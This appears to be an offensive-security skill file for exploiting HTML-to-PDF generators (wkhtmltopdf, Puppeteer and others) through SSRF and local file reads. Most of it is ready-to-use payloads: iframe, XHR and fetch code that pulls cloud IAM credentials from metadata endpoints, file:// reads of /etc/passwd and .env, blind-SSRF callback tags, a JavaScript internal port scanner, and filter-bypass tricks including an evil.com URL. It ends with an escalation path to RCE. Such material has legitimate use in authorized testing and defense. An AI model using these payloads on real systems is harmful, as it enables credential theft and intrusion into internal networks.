---
name: pdf-ssrf
pattern: PDF Generator SSRF and LFI
description: "Test PDF export/generation features for SSRF via iframe/XHR/fetch injection, LFI via file:// protocol, and blind SSRF via resource loading tags"
triggers: ["/test-ssrf", "pdf ssrf", "pdf lfi", "wkhtmltopdf", "puppeteer ssrf", "export to pdf", "pdf generator", "html to pdf", "invoice pdf", "report pdf"]
tech: [wkhtmltopdf, puppeteer, chromium, prince, dompdf, generic]
severity: High-Critical
related_patterns: [ssrf-to-rce-chain, ssrf-redirect-loop-exfil, nextjs-ssrf, file-upload-techniques, lfi-path-traversal, auto-chain-discovery]
sources: ["Intigriti blog — Exploiting PDF Generators guide", "PortSwigger research"]
---

# PDF Generator SSRF & LFI

> Source: Intigriti blog - Exploiting PDF Generators guide

## Crown Jewel Targets

- **AWS IAM credentials** via iframe/XHR to `169.254.169.254` rendered in generated PDF
- **Local filesystem secrets** (`/etc/passwd`, `.env`, `/proc/self/environ`) via `file://` protocol in wkhtmltopdf
- **Internal service admin panels** (Redis, Elasticsearch, Jenkins) reachable through PDF renderer's server-side fetch
- **Cloud metadata tokens** (GCP, Azure) for lateral cloud movement
- **Application config files** (`app.settings.json`, `database.yml`) via LFI in PDF context
- **Internal network topology** mapped via port scanning through PDF renderer's time-based img onerror

## Attack Surface Signals

- "Export to PDF", "Download as PDF", "Print report" buttons on dashboards/invoices
- User-controlled fields rendered in PDF (name, address, comments, descriptions)
- `wkhtmltopdf`, `HeadlessChrome`, `Prince`, `dompdf` in PDF metadata (`exiftool output.pdf`)
- Queue-based async PDF generation (job ID returned, PDF fetched later)
- Invoice/receipt/certificate generation from user input
- E-commerce order confirmation PDFs with controllable fields

## Where to Find PDF Generators

- Report/analytics export (dashboards, statements)
- E-commerce receipts/invoices
- Account data export, bank statements
- Certificates (education, training platforms)
- Any "Export to PDF" or "Download as PDF" feature

## Identify the Engine

| Engine | Fingerprint |
|--------|------------|
| wkhtmltopdf | `--disable-local-file-access` errors, Qt WebKit UA, older CSS rendering |
| Chromium/Puppeteer | Modern CSS, `HeadlessChrome` in metadata |
| WeasyPrint | Python-based, limited JS support |
| Prince | `Prince` in PDF metadata |
| dompdf | PHP, no JS execution |

Check PDF metadata: `exiftool output.pdf` — Creator/Producer fields reveal engine.

## Full SSRF Payloads (Response Readable in PDF)

### iframe (most common)
```html
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="800"></iframe>
<iframe src="file:///etc/passwd" width="800" height="800"></iframe>
```

### XHR Exfiltration
```html
<script>
var x = new XMLHttpRequest();
x.onload = function() { document.write(this.responseText); };
x.open('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/');
x.send();
</script>
```

### Fetch API
```html
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(t => document.write('<pre>' + t + '</pre>'));
</script>
```

### Embed Tag
```html
<embed src="http://127.0.0.1:8080/" type="text/html" width="800" height="800">
```

## Blind SSRF Payloads (No Response in PDF)

Use these when content isn't rendered — detect via OOB callback (Burp Collaborator / interactsh):

```html
<!-- Resource loading tags -->
<link rel="stylesheet" href="http://COLLABORATOR/">
<script src="http://COLLABORATOR/"></script>
<img src="http://COLLABORATOR/">
<input type="image" src="http://COLLABORATOR/">
<video src="http://COLLABORATOR/"></video>
<audio src="http://COLLABORATOR/"></audio>

<!-- Meta refresh -->
<meta http-equiv="refresh" content="0;url=http://COLLABORATOR/">

<!-- Base tag (poisons all relative URLs) -->
<base href="http://COLLABORATOR/">

<!-- CSS import -->
<style>@import url('http://COLLABORATOR/');</style>

<!-- SVG -->
<svg><image href="http://COLLABORATOR/"></svg>

<!-- Object -->
<object data="http://COLLABORATOR/"></object>
```

## Local File Read (LFI)

```html
<!-- Direct file:// -->
<iframe src="file:///etc/passwd" height="1000" width="1000"></iframe>
<iframe src="file:///proc/self/environ" height="1000" width="1000"></iframe>
<iframe src="file:///home/app/.env" height="1000" width="1000"></iframe>

<!-- XHR to file:// (wkhtmltopdf) -->
<script>
x = new XMLHttpRequest();
x.onload = function(){ document.write(this.responseText) };
x.open("GET","file:///etc/hostname");
x.send();
</script>
```

## Cloud Metadata Targets

```
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/  (needs Metadata-Flavor: Google header)
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01  (needs Metadata: true header)

# AWS ECS Task
http://169.254.170.2/v2/credentials/<GUID>
```

## Bypass Techniques

| Block | Bypass |
|-------|--------|
| `http://` blocked | Use `//COLLABORATOR` (protocol-relative) |
| `127.0.0.1` blocked | `0x7f000001`, `2130706433`, `127.1`, `[::1]`, `0177.0.0.1` |
| `169.254.169.254` blocked | `0xa9fea9fe`, DNS rebinding, `169.254.169.254.nip.io` |
| `<script>` stripped | Use `<img onerror=>`, `<svg onload=>`, `<body onload=>` |
| `<iframe>` stripped | Use `<embed>`, `<object>`, CSS `@import`, `<link>` |
| URL whitelist | Open redirect chain, `@` in URL: `http://allowed.com@evil.com` |
| `file://` blocked | Try `File://`, `FILE://`, UNC `\\127.0.0.1\c$\etc\passwd` |

## Internal Port Scanning via PDF

```html
<script>
// Time-based port scan
for (let port of [22,80,443,3306,5432,6379,8080,9200]) {
  let img = new Image();
  let start = Date.now();
  img.onerror = function() {
    let time = Date.now() - start;
    if (time < 1000) document.write('Port ' + port + ' OPEN (' + time + 'ms)<br>');
  };
  img.src = 'http://127.0.0.1:' + port + '/';
}
</script>
```

## Escalation Path

1. **SSRF** → Read cloud metadata → Get IAM credentials
2. **SSRF** → Internal service access → Admin panels, databases
3. **LFI** → Read `.env`, config files → API keys, DB creds
4. **SSRF + CVE-2023-33733** → RCE via template injection in reportlab
5. **Blind SSRF** → Port scan internal network → Pivot to internal services

## Detection Checklist

- [ ] Find PDF export/generation feature
- [ ] Identify controllable input fields (name, address, comments, etc.)
- [ ] Inject basic HTML (`<b>test</b>`) — does it render?
- [ ] Test `<img src=http://COLLAB>` for OOB callback
- [ ] Try `<iframe src=file:///etc/hostname>` for LFI
- [ ] Try `<script>` payloads for full SSRF
- [ ] Check if async generation (queue-based) — may bypass timeouts
- [ ] Identify cloud environment (AWS/GCP/Azure) from metadata
- [ ] Escalate: credentials, internal access, RCE

---

## Operator Notes (Battle-Tested)

- **Invoice/receipt PDFs are the #1 vector** — user-controlled fields like "name", "address", "company" often rendered as HTML in PDF
- **Always check PDF metadata first** — `exiftool output.pdf` reveals engine (wkhtmltopdf, HeadlessChrome, Prince). wkhtmltopdf is the most exploitable (JS + file:// support)
- **Async generation bypasses timeouts** — queue-based PDF generation gives the renderer more time, enabling slower payloads like XHR exfiltration
- **Test `<b>test</b>` first** — if bold text renders, HTML injection is confirmed. Then escalate to iframe/script tags
- **Protocol-relative URLs bypass `http://` blocks** — use `//COLLABORATOR/` when explicit protocol is filtered
- **Double CRLF for body injection** — `%0d%0a%0d%0a<script>...</script>` can inject full response body in some configurations
- **SVG-in-PDF trick** — upload SVG with embedded XHR/fetch, some PDF generators process SVG as trusted content
- **Blind SSRF via `<base>` tag** — poisons all relative URLs in the PDF template, sending every resource request to attacker server

## Related Skills & Chains

| Situation | Pattern / Skill |
|-----------|----------------|
| PDF SSRF confirmed, need RCE | `ssrf-to-rce-chain` |
| Blind SSRF only, need response | `ssrf-redirect-loop-exfil` |
| SSRF to internal Redis/Memcached | `ssrf-protocol-smuggling-chain` |
| File upload to PDF pipeline | `file-upload-techniques` |
| LFI via file:// in PDF | `lfi-path-traversal` |
| Next.js target with PDF export | `nextjs-ssrf` |
